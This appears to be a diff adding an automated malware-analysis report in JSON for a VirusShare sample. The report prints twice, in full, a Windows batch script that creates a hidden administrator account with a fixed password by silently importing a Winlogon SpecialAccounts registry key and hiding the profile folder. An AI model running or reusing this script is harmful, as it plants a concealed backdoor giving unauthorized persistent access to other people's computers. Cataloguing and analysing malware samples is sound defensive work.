@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\n@echo HideUserXP.bat\n@echo by illwill    http://illmob.org\n@echo This will create a hidden user with admin rights in XP\n@echo ( hidden meaning that the username wont appear in the logon screen)\n@echo To log on to your hidden account, you need to use the Log On To Windows dialog box by pressing Ctrl + Alt + Delete twice.\n@echo Make sure you're logged off all accounts. You can't just switch users.\n\n\nnet user illwill password /add && net localgroup administrators illwill /add\necho Windows Registry Editor Version 5.00> c:\\hide.reg\necho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList]>> c:\\hide.reg\necho \"illwill\"=dword:00000000>> c:\\hide.reg\nREGEDIT /S c:\\hide.REG\nDEL /Q c:\\hide.REG\nattrib +r +a +s +h %SystemDrive%\\docume~1\\illwill\nExit"
+    },
+    "filename": "VirusShare_8cb9b743f2608aa4975e40957734e8d0",
+    "filesize": 818,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8cb9b743f2608aa4975e40957734e8d0",
+        "sha1": "555dc31e9290dbd67dd96ed137ac8615713195ba",
+        "sha256": "b2037a90ddb4e617bf6f56d3bdc59c29f241f847b65bb9c409ea3ec4222b1c9f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "@echo HideUserXP.bat",
+            "@echo by illwill    http://illmob.org",
+            "@echo This will create a hidden user with admin rights in XP",
+            "@echo ( hidden meaning that the username wont appear in the logon screen)",
+            "@echo To log on to your hidden account, you need to use the Log On To Windows dialog box by pressing Ctrl + Alt + Delete twice.",
+            "@echo Make sure you're logged off all accounts. You can't just switch users.",
+            "net user illwill password /add && net localgroup administrators illwill /add",
+            "echo Windows Registry Editor Version 5.00> c:\\hide.reg",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList]>> c:\\hide.reg",
+            "echo \"illwill\"=dword:00000000>> c:\\hide.reg",
+            "REGEDIT /S c:\\hide.REG",
+            "DEL /Q c:\\hide.REG",
+            "attrib +r +a +s +h %SystemDrive%\\docume~1\\illwill",
+            "Exit"
+        ],
+        "file": {
+            "DEL /Q c:\\hide.REG": "Registry",
+            "REGEDIT /S c:\\hide.REG": "Registry",
+            "echo \"illwill\"=dword:00000000>> c:\\hide.reg": "Registry",
+            "echo Windows Registry Editor Version 5.00> c:\\hide.reg": "Registry",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList]>> c:\\hide.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://illmob.org"
+        ]
+    },
+    "time": "0:00:00.284394",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
